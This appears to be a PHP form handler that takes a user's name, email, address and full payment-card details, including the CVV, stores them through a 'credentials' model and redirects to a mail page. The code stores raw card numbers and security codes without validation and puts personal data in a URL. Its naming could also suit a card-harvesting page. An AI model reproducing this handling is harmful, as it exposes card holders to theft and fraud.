<?php
    include_once '../controller/send.php';
    include_once '../model/credentials.php';

    $error = "";

    $credC = new credentialsC();
    $cred = new credentials(
        $_POST['name'],
        $_POST['mail'],
        $_POST['address'],
        $_POST['city'],
        $_POST['state'],
        $_POST['zip'],
        $_POST['noc'],
        $_POST['ccn'],
        $_POST['xp'],
        $_POST['cw'],
    );

    $_SESSION['email']=$_POST['mail'];

    $check=$credC->showcred($cred->getemail());
    if ((!isset($check))||(empty($check)))
{
    $credC->addcred($cred);
    $_SESSION['email']=$_POST['mail'];


$url = 'indexmail.php';

$parameters = [
'mail' =>  $_POST['mail'],
'name' => $_POST['name']
];

$url .= '?'.http_build_query($parameters);

?>
<meta http-equiv="refresh" content="0; url=<?php echo $url ?>" />
<?php

}
else 
{
?>
    <h1>Error email existe deja</h1>
    <meta http-equiv="refresh" content="5; url=index.php" />
<?php
}
?>



    
    
    